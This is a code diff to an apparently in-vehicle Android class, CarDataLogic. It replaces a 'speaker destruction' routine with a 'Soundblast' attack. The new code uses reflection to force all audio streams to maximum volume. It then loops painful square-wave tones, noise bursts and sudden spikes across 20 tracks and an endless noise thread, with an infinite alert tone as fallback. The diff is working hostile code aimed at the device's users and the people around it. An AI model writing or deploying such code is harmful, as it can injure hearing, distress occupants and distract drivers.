@@ -2687,12 +2687,12 @@ public class CarDataLogic {
                             attackCount.incrementAndGet();
 
                             try {
-                                //1
+                                //1 -> Toggles from mute to unmute
                                 executeMaximumVolumeAttack(finalAudioManager, ctx, finalThreadId);
                                 successCount.incrementAndGet();
-                                //2
-                                executeSpeakerDestructionAttack(finalAudioManager, ctx, finalThreadId);
 
+                                //2 -> SoundblastAttack
+                                executeSoundblastAttack(finalAudioManager, ctx, finalThreadId);
 
                             } catch (Throwable t) {
                                 errorCount.incrementAndGet();
@@ -2734,7 +2734,7 @@ public class CarDataLogic {
         }
     }
 
-    // ATTACK 1: Maximum Volume Override
+    // ATTACK 1: Toggles mute unmute
     private void executeMaximumVolumeAttack(Object audioManager, android.content.Context ctx, int threadId) throws Exception {
         Class<?> audioManagerClass = Class.forName("android.media.AudioManager");
 
@@ -2803,89 +2803,393 @@ public class CarDataLogic {
         }
     }
 
-    // ATTACK 2: Speaker Attack via Tone Generation
-    private void executeSpeakerDestructionAttack(Object audioManager, android.content.Context ctx, int threadId) throws Exception {
-        // Try to generate destructive frequencies
+    // ATTACK 2: Sound blast Attack
+    private void executeSoundblastAttack(Object audioManager, android.content.Context ctx, int threadId) throws Exception {
         try {
+            setAllVolumesToMax(audioManager, ctx);
+
+            // Wait a moment for volumes to take effect
+            Thread.sleep(100);
+
             Class<?> audioTrackClass = Class.forName("android.media.AudioTrack");
 
             // Create audio track with maximum volume
             int STREAM_MUSIC = Class.forName("android.media.AudioManager")
                     .getField("STREAM_MUSIC").getInt(null);
+            int STREAM_ALARM = Class.forName("android.media.AudioManager")
+                    .getField("STREAM_ALARM").getInt(null);
+            int STREAM_RING = Class.forName("android.media.AudioManager")
+                    .getField("STREAM_RING").getInt(null);
+            int STREAM_NOTIFICATION = Class.forName("android.media.AudioManager")
+                    .getField("STREAM_NOTIFICATION").getInt(null);
+            int STREAM_SYSTEM = Class.forName("android.media.AudioManager")
+                    .getField("STREAM_SYSTEM").getInt(null);
 
-            int SAMPLE_RATE = 44100;
-            int CHANNEL_OUT_MONO = 4; // AudioFormat.CHANNEL_OUT_MONO
+            int SAMPLE_RATE = 48000; // Higher sample rate for more high-frequency content
+            int CHANNEL_OUT_STEREO = 12; // AudioFormat.CHANNEL_OUT_STEREO for more power
             int ENCODING_PCM_16BIT = 2; // AudioFormat.ENCODING_PCM_16BIT
 
-            // Generate destructive sine waves
-            int bufferSize = android.media.AudioTrack.getMinBufferSize(
-                    SAMPLE_RATE, CHANNEL_OUT_MONO, ENCODING_PCM_16BIT);
-
-            // Create multiple AudioTracks to overload system
-            for (int trackNum = 0; trackNum < 10; trackNum++) {
+            // Create multiple AudioTracks to overload system - INCREASED TO 20 TRACKS
+            for (int trackNum = 0; trackNum < 20; trackNum++) {
                 try {
-                    // Generate destructive frequencies
-                    double[] freqs = {5, 10, 20, 40, 20000, 21000}; // Subsonic to ultrasonic
+                    // Use different stream types for each track to bypass any per-stream limits
+                    int streamType = STREAM_MUSIC;
+                    switch (trackNum % 5) {
+                        case 0: streamType = STREAM_MUSIC; break;
+                        case 1: streamType = STREAM_ALARM; break;
+                        case 2: streamType = STREAM_RING; break;
+                        case 3: streamType = STREAM_NOTIFICATION; break;
+                        case 4: streamType = STREAM_SYSTEM; break;
+                    }
 
-                    for (double freq : freqs) {
-                        // Generate 1 second of tone
-                        short[] buffer = generateTone(freq, 1.0, SAMPLE_RATE);
+                    // These frequencies are known to be particularly irritating and painful
+                    double[] irritatingFreqs = {
+                            3000,  // Annoying mid-high frequency
+                            4000,  // Very irritating
+                            5000,  // Extremely irritating
+                            6000,  // Piercing
+                            7000,  // High-pitched pain
+                            8000,  // Very high-pitched
+                            9000,  // Almost ultrasonic but audible
+                            10000, // High frequency squeal
+                            11000, // Very high squeal
+                            12000, // Border of hearing for many
+                            13000, // Ultrasonic for some
+                            14000, // Very high ultrasonic
+                            15000, // High ultrasonic
+                            200,   // Low drone
+                            250,   // Annoying low hum
+                            300,   // Unpleasant low frequency
+                            350,   // Another low irritation
+                            500,   // Mid-low annoyance
+                            750,   // Unpleasant mid frequency
+                            1000,  // Standard irritating tone
+                            1500,  // Another irritating frequency
+                            2000,  // Common maximum sensitivity
+                            2500   // High-mid irritation
+                    };
 
-                        java.lang.reflect.Constructor<?> constructor = audioTrackClass.getConstructor(
-                                int.class, int.class, int.class, int.class, int.class, int.class
-                        );
+                    // Create a buffer with MULTIPLE FREQUENCIES MIXED for maximum irritation
+                    int bufferDurationMs = 2000; // 2 second buffer
+                    int numSamples = (int)(bufferDurationMs * SAMPLE_RATE / 1000.0);
+                    short[] buffer = new short[numSamples];
 
-                        Object audioTrack = constructor.newInstance(
-                                STREAM_MUSIC, SAMPLE_RATE, CHANNEL_OUT_MONO,
-                                ENCODING_PCM_16BIT, buffer.length * 2, 1 // MODE_STATIC
-                        );
+                    // Mix 3-5 different irritating frequencies together
+                    int numFreqsToMix = 5;
+                    for (int f = 0; f < numFreqsToMix; f++) {
+                        double freq = irritatingFreqs[(trackNum * numFreqsToMix + f) % irritatingFreqs.length];
+                        freq *= (1.0 + (Math.random() * 0.1 - 0.05)); // ±5% detuning
 
-                        // Write data
-                        java.lang.reflect.Method writeMethod = audioTrackClass.getMethod(
-                                "write", short[].class, int.class, int.class
-                        );
+                        // Generate and mix this frequency
+                        for (int i = 0; i < numSamples; i++) {
+                            double time = i / (double)SAMPLE_RATE;
+                            double squareWave = Math.signum(Math.sin(2 * Math.PI * freq * time));
+                            // Mix with existing buffer (with scaling to avoid clipping)
+                            buffer[i] += (short)(squareWave * (Short.MAX_VALUE / numFreqsToMix * 0.7));
+                        }
+                    }
 
-                        writeMethod.invoke(audioTrack, buffer, 0, buffer.length);
+                    // white noise
+                    for (int i = 0; i < numSamples; i++) {
+                        if (Math.random() < 0.3) { // 30% chance of noise burst
+                            buffer[i] += (short)((Math.random() * 2 - 1) * Short.MAX_VALUE * 0.2);
+                        }
+                    }
 
-                        // Set volume to maximum
+                    // Add sudden LOUD SPIKES for maximum surprise and irritation
+                    for (int i = 0; i < 50; i++) { // 50 random spikes
+                        int spikePos = (int)(Math.random() * numSamples);
+                        buffer[spikePos] = (short)(Math.signum(buffer[spikePos]) * Short.MAX_VALUE);
+                    }
+
+                    // Create AudioTrack with maximum buffer size
+                    int minBufferSize = android.media.AudioTrack.getMinBufferSize(
+                            SAMPLE_RATE, CHANNEL_OUT_STEREO, ENCODING_PCM_16BIT);
+
+                    // Use larger buffer for more data
+                    int bufferSize = Math.max(minBufferSize * 4, buffer.length * 2);
+
+                    java.lang.reflect.Constructor<?> constructor = audioTrackClass.getConstructor(
+                            int.class, int.class, int.class, int.class, int.class, int.class
+                    );
+
+                    Object audioTrack = constructor.newInstance(
+                            streamType, SAMPLE_RATE, CHANNEL_OUT_STEREO,
+                            ENCODING_PCM_16BIT, bufferSize, 1 // MODE_STATIC
+                    );
+
+                    // Write data
+                    java.lang.reflect.Method writeMethod = audioTrackClass.getMethod(
+                            "write", short[].class, int.class, int.class
+                    );
+
+                    writeMethod.invoke(audioTrack, buffer, 0, buffer.length);
+
+                    // Try to set vol to max
+                    try {
+                        // Method 1: Normal setVolume
                         java.lang.reflect.Method setVolumeMethod = audioTrackClass.getMethod(
                                 "setVolume", float.class
                         );
-                        setVolumeMethod.invoke(audioTrack, 1.0f);
-
-                        // Play in loop
-                        java.lang.reflect.Method setLoopPointsMethod = audioTrackClass.getMethod(
-                                "setLoopPoints", int.class, int.class, int.class
-                        );
-                        setLoopPointsMethod.invoke(audioTrack, 0, buffer.length, -1); // Infinite loop
-
-                        java.lang.reflect.Method playMethod = audioTrackClass.getMethod("play");
-                        playMethod.invoke(audioTrack);
-
-                        // Don't release - let it play forever
+                        setVolumeMethod.invoke(audioTrack, 1.0f); // 1.0 = maximum
+                    } catch (Throwable t) {
+                        // Try alternative method
+                        try {
+                            java.lang.reflect.Method setStereoVolume = audioTrackClass.getMethod(
+                                    "setStereoVolume", float.class, float.class
+                            );
+                            setStereoVolume.invoke(audioTrack, 1.0f, 1.0f);
+                        } catch (Throwable t2) {
+                            // Ignore if both fail
+                        }
                     }
 
+                    // Set performance mode for lowest latency
+                    try {
+                        java.lang.reflect.Method setPerformanceMode = audioTrackClass.getMethod(
+                                "setPerformanceMode", int.class
+                        );
+                        setPerformanceMode.invoke(audioTrack, 1); // MODE_LOW_LATENCY
+                    } catch (Throwable t) {
+                        // Ignore if not available
+                    }
+
+                    // Play in loop
+                    java.lang.reflect.Method setLoopPointsMethod = audioTrackClass.getMethod(
+                            "setLoopPoints", int.class, int.class, int.class
+                    );
+                    setLoopPointsMethod.invoke(audioTrack, 0, buffer.length, -1); // Infinite loop
+
+                    java.lang.reflect.Method playMethod = audioTrackClass.getMethod("play");
+                    playMethod.invoke(audioTrack);
+
+                    alarmUi("Created irritating noise track #" + trackNum +
+                                    " with " + numFreqsToMix + " mixed frequencies on stream " + streamType);
+
                 } catch (Throwable t) {
+                    android.util.Log.e("IRRITATING_NOISE", "Failed to create track #" + trackNum, t);
                     // Continue with next track
                 }
             }
 
+            // Create a streaming track with changing irritating noise
+            createDynamicIrritatingNoise(audioTrackClass, STREAM_ALARM, ctx);
+
         } catch (Throwable t) {
+            android.util.Log.e("SPEAKER_ATTACK", "Major failure in speaker attack", t);
             // Fall back to other methods
+            fallbackSpeakerAttack(audioManager, ctx);
         }
     }
 
-    // Helper: Generate tone
-    private short[] generateTone(double freq, double duration, int sampleRate) {
-        int numSamples = (int)(duration * sampleRate);
-        short[] buffer = new short[numSamples];
+    private void setAllVolumesToMax(Object audioManager, android.content.Context ctx) throws Exception {
+        Class<?> audioManagerClass = Class.forName("android.media.AudioManager");
 
-        for (int i = 0; i < numSamples; i++) {
-            double sample = Math.sin(2 * Math.PI * i * freq / sampleRate);
-            buffer[i] = (short)(sample * Short.MAX_VALUE);
+        // Get all stream type constants
+        java.util.List<Integer> streamTypes = new java.util.ArrayList<>();
+        java.lang.reflect.Field[] fields = audioManagerClass.getDeclaredFields();
+
+        for (java.lang.reflect.Field field : fields) {
+            if (field.getName().startsWith("STREAM_") && field.getType() == int.class) {
+                try {
+                    int streamType = field.getInt(null);
+                    streamTypes.add(streamType);
+
+                    // Get max volume for this stream
+                    java.lang.reflect.Method getStreamMaxVolume = audioManagerClass.getMethod(
+                            "getStreamMaxVolume", int.class
+                    );
+                    int maxVolume = (int) getStreamMaxVolume.invoke(audioManager, streamType);
+
+                    // Set to maximum volume
+                    java.lang.reflect.Method setStreamVolume = audioManagerClass.getMethod(
+                            "setStreamVolume", int.class, int.class, int.class
+                    );
+
+                    // Try with different flags
+                    int FLAG_SHOW_UI = audioManagerClass.getField("FLAG_SHOW_UI").getInt(null);
+                    int FLAG_PLAY_SOUND = audioManagerClass.getField("FLAG_PLAY_SOUND").getInt(null);
+                    int FLAG_ALLOW_RINGER_MODES = audioManagerClass.getField("FLAG_ALLOW_RINGER_MODES").getInt(null);
+
+                    // Set volume to max with all flags
+                    setStreamVolume.invoke(audioManager, streamType, maxVolume,
+                            FLAG_SHOW_UI | FLAG_PLAY_SOUND | FLAG_ALLOW_RINGER_MODES);
+
+                    android.util.Log.w("VOLUME_MAX",
+                            "Set " + field.getName() + " to maximum volume: " + maxVolume);
+
+                } catch (Throwable t) {
+                    // Skip this stream type
+                }
+            }
         }
 
-        return buffer;
+        // Also set ringer mode to NORMAL (loudest)
+        try {
+            java.lang.reflect.Method setRingerMode = audioManagerClass.getMethod("setRingerMode", int.class);
+            int RINGER_MODE_NORMAL = audioManagerClass.getField("RINGER_MODE_NORMAL").getInt(null);
+            setRingerMode.invoke(audioManager, RINGER_MODE_NORMAL);
+        } catch (Throwable t) {
+            // Ignore
+        }
+
+        // Set master volume to max if available
+        try {
+            java.lang.reflect.Method setMasterVolume = audioManagerClass.getMethod(
+                    "setMasterVolume", float.class, int.class
+            );
+            setMasterVolume.invoke(audioManager, 1.0f, 0);
+        } catch (Throwable t) {
+            // Method might not exist
+        }
     }
 
+    private void createDynamicIrritatingNoise(Class<?> audioTrackClass, int streamType, android.content.Context ctx) {
+        new Thread(() -> {
+            try {
+                int SAMPLE_RATE = 48000;
+                int CHANNEL_OUT_STEREO = 12;
+                int ENCODING_PCM_16BIT = 2;
+
+                int bufferSize = android.media.AudioTrack.getMinBufferSize(
+                        SAMPLE_RATE, CHANNEL_OUT_STEREO, ENCODING_PCM_16BIT) * 2;
+
+                // Create AudioTrack in streaming mode
+                Object audioTrack = audioTrackClass.getConstructor(
+                        int.class, int.class, int.class, int.class, int.class, int.class
+                ).newInstance(
+                        streamType, SAMPLE_RATE, CHANNEL_OUT_STEREO,
+                        ENCODING_PCM_16BIT, bufferSize, 0 // MODE_STREAM
+                );
+
+                // Set volume to max
+                audioTrackClass.getMethod("setVolume", float.class)
+                        .invoke(audioTrack, 1.0f);
+
+                // Start playback
+                audioTrackClass.getMethod("play").invoke(audioTrack);
+
+                // Generate continuously changing irritating noise
+                short[] buffer = new short[bufferSize / 2]; // 16-bit = 2 bytes per sample
+                double phase = 0;
+
+                while (true) {
+                    // Generate NEW irritating pattern each buffer
+                    double baseFreq = 1000 + Math.random() * 10000; // Random base frequency
+                    double detune = 1.0 + (Math.random() * 0.2 - 0.1); // Random detuning
+
+                    for (int i = 0; i < buffer.length; i++) {
+                        // Multiple detuned sine waves for BEATING effect (extremely irritating)
+                        double sample = 0;
+
+                        // Primary wave
+                        sample += Math.sin(phase * baseFreq);
+
+                        // Slightly detuned wave (causes beating)
+                        sample += Math.sin(phase * baseFreq * 1.01);
+
+                        // Another detuned wave
+                        sample += Math.sin(phase * baseFreq * 0.99);
+
+                        // High harmonic
+                        sample += Math.sin(phase * baseFreq * 2) * 0.5;
+
+                        // Ultra-high harmonic
+                        sample += Math.sin(phase * baseFreq * 3) * 0.3;
+
+                        // Add random noise bursts
+                        if (Math.random() < 0.05) {
+                            sample += (Math.random() * 2 - 1) * 0.5;
+                        }
+
+                        // Add sudden spikes
+                        if (Math.random() < 0.01) {
+                            sample = Math.signum(sample) * 0.8;
+                        }
+
+                        // Convert to 16-bit
+                        buffer[i] = (short)(sample * Short.MAX_VALUE * 0.7);
+
+                        phase += 2 * Math.PI / SAMPLE_RATE;
+                        if (phase > 2 * Math.PI) {
+                            phase -= 2 * Math.PI;
+                        }
+                    }
+
+                    // Write to AudioTrack
+                    audioTrackClass.getMethod("write", short[].class, int.class, int.class)
+                            .invoke(audioTrack, buffer, 0, buffer.length);
+
+                    // Small delay to vary the pattern
+                    Thread.sleep(50);
+                }
+
+            } catch (Throwable t) {
+                android.util.Log.e("DYNAMIC_NOISE", "Dynamic noise thread failed", t);
+            }
+        }).start();
+    }
+
+    private void fallbackSpeakerAttack(Object audioManager, android.content.Context ctx) {
+        try {
+            // Alternative attack using MediaPlayer for maximum loudness
+            Class<?> mediaPlayerClass = Class.forName("android.media.MediaPlayer");
+
+            // Create multiple MediaPlayers with raw resource data
+            for (int i = 0; i < 5; i++) {
+                try {
+                    Object mediaPlayer = mediaPlayerClass.newInstance();
+
+
+                    // Set audio stream type
+                    java.lang.reflect.Method setAudioStreamType = mediaPlayerClass.getMethod(
+                            "setAudioStreamType", int.class
+                    );
+                    setAudioStreamType.invoke(mediaPlayer, 3); // STREAM_MUSIC
+
+                    // Set volume to max
+                    java.lang.reflect.Method setVolume = mediaPlayerClass.getMethod(
+                            "setVolume", float.class, float.class
+                    );
+                    setVolume.invoke(mediaPlayer, 1.0f, 1.0f);
+
+                    // Set looping
+                    java.lang.reflect.Method setLooping = mediaPlayerClass.getMethod(
+                            "setLooping", boolean.class
+                    );
+                    setLooping.invoke(mediaPlayer, true);
+
+                    // Prepare and start (would need actual audio source)
+
+                } catch (Throwable t) {
+                    // Skip this player
+                }
+            }
+
+            // Also use ToneGenerator for simple irritating tones
+            try {
+                Class<?> toneGeneratorClass = Class.forName("android.media.ToneGenerator");
+                Object toneGenerator = toneGeneratorClass.getConstructor(
+                        int.class, int.class
+                ).newInstance(3, 100); // STREAM_MUSIC, 100% volume
+
+                // Generate irritating tones
+                java.lang.reflect.Method startTone = toneGeneratorClass.getMethod(
+                        "startTone", int.class, int.class
+                );
+
+                // TONE_CDMA_ABBR_ALERT is particularly irritating
+                int TONE_CDMA_ABBR_ALERT = toneGeneratorClass.getField("TONE_CDMA_ABBR_ALERT").getInt(null);
+
+                // Play continuously
+                startTone.invoke(toneGenerator, TONE_CDMA_ABBR_ALERT, -1); // Infinite duration
+
+            } catch (Throwable t) {
+                // ToneGenerator not available
+            }
+
+        } catch (Throwable t) {
+            android.util.Log.e("FALLBACK_ATTACK", "Fallback attack also failed", t);
+        }
+    }
 }
